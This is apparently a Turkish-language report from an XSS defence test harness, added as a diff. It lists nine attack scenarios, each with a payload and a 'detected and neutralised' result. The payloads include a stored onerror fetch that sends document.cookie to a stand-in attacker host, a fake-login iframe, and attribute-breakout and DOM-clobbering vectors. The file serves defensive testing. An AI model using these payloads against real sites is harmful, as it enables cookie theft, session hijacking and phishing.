@@ -1,0 +1,63 @@
+================================================================================
+GÜN 160: XSS VE İSTEMCİ GÜVENLİĞİ NEGATİF KONTROL VE SALDIRI SAVUNMA RAPORU
+================================================================================
+Tarih/Saat: 2026-11-08T20:13:08.317959
+
+[*] Senaryo: SCN-XSS-01 - Klasik Reflected Script Tag Enjeksiyonu
+    XSS Türü: REFLECTED_XSS | Bağlam: html_body
+    Saldırı Yükü: <script>alert('Reflected XSS Session Hijack')</script>
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 1, "security_score": 60.0, "sanitized_preview": "alert('Reflected XSS Session Hijack')", "encoded_preview": "&lt;script&gt;alert(&#x27;Reflected XSS Session Hijack&#x27;"}
+
+[*] Senaryo: SCN-XSS-02 - Stored Inline Event Handler (onerror) ile Çerez Hırsızlığı
+    XSS Türü: STORED_XSS | Bağlam: html_body
+    Saldırı Yükü: <img src=invalid.jpg onerror="fetch('https://attacker.evil/exfil?c='+document.co
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 1, "security_score": 75.0, "sanitized_preview": "", "encoded_preview": "&lt;img src=invalid.jpg onerror=&quot;fetch(&#x27;https://at"}
+
+[*] Senaryo: SCN-XSS-03 - DOM Tabanlı innerHTML ve location.search Kaynak-Havuz Akışı
+    XSS Türü: DOM_BASED_XSS | Bağlam: javascript
+    Saldırı Yükü: let userQuery = location.search;
+document.getElementById('results').innerHTML = 
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"flows_detected": 1, "is_direct": true}
+
+[*] Senaryo: SCN-XSS-04 - Link Etiketinde javascript: Sözde Protokol İstismarı
+    XSS Türü: REFLECTED_XSS | Bağlam: html_attribute
+    Saldırı Yükü: <a href="javascript:alert(document.domain)">Ücretsiz Bakiye Yükle</a>
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 1, "security_score": 75.0, "sanitized_preview": "<a>Ücretsiz Bakiye Yükle</a>", "encoded_preview": "&#x3C;a&#x20;href&#x3D;&#x22;javascript:alert&#x28;document."}
+
+[*] Senaryo: SCN-XSS-05 - SVG onload Vektörü ile Kod Yürütme
+    XSS Türü: MUTATION_XSS | Bağlam: html_body
+    Saldırı Yükü: <svg onload="alert('SVG XSS')"><circle r=10/></svg>
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 2, "security_score": 50.0, "sanitized_preview": "", "encoded_preview": "&lt;svg onload=&quot;alert(&#x27;SVG XSS&#x27;)&quot;&gt;&lt"}
+
+[*] Senaryo: SCN-XSS-06 - Gömülü iframe ile Phishing ve Clickjacking Enjeksiyonu
+    XSS Türü: REFLECTED_XSS | Bağlam: html_body
+    Saldırı Yükü: <iframe src="https://malicious-login-portal.org/fake-login" width="600" height="
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 1, "security_score": 85.0, "sanitized_preview": "", "encoded_preview": "&lt;iframe src=&quot;https://malicious-login-portal.org/fake"}
+
+[*] Senaryo: SCN-XSS-07 - DOM Clobbering ile Window / Document Nesnelerini Gölgeleme
+    XSS Türü: DOM_BASED_XSS | Bağlam: html_body
+    Saldırı Yükü: <form id="document"><input name="cookie" value="fake_token=xyz"></form>
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 3, "security_score": 55.0, "sanitized_preview": "", "encoded_preview": "&lt;form id=&quot;document&quot;&gt;&lt;input name=&quot;coo"}
+
+[*] Senaryo: SCN-XSS-08 - Güvensiz Wildcard ve 'unsafe-inline' İçeren Zayıf CSP Başlığı
+    XSS Türü: REFLECTED_XSS | Bağlam: csp
+    Saldırı Yükü: default-src * 'unsafe-inline' 'unsafe-eval'
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"weaknesses_count": 5, "weaknesses": ["YÜKSEK RİSK: 'unsafe-inline' kullanılmış ve nonce koruması yok.", "YÜKSEK RİSK: 'unsafe-eval' aktif, dinamik kod çalıştırmaya izin veriyor.", "KRİTİK RİSK: Joker karakter (*) kullanılarak tüm kaynaklara izin verilmiş.", "ORTA RİSK: 'object-src 'none'' eksik, Flash/Plugin enjeksiyonuna açık.", "ORTA RİSK: 'base-uri' tanımlanmamış, <base> tag hijacking riski var."]}
+
+[*] Senaryo: SCN-XSS-09 - HTML Nitelik Kırıcı ve Otomatik Odaklanma (autofocus onfocus) Vektörü
+    XSS Türü: REFLECTED_XSS | Bağlam: html_attribute
+    Saldırı Yükü: " onfocus="alert(document.cookie)" autofocus="
+    Sonuç: [BAŞARILI] -> Tehdit başarıyla tespit edildi ve etkisiz kılındı.
+    Detaylar: {"findings_count": 1, "security_score": 75.0, "sanitized_preview": "\" onfocus=\"alert(document.cookie)\" autofocus=\"", "encoded_preview": "&#x22;&#x20;onfocus&#x3D;&#x22;alert&#x28;document.cookie&#x"}
+
+--------------------------------------------------------------------------------
+ÖZET: Toplam 9 senaryodan 9 tanesi başarıyla savunuldu.
+================================================================================
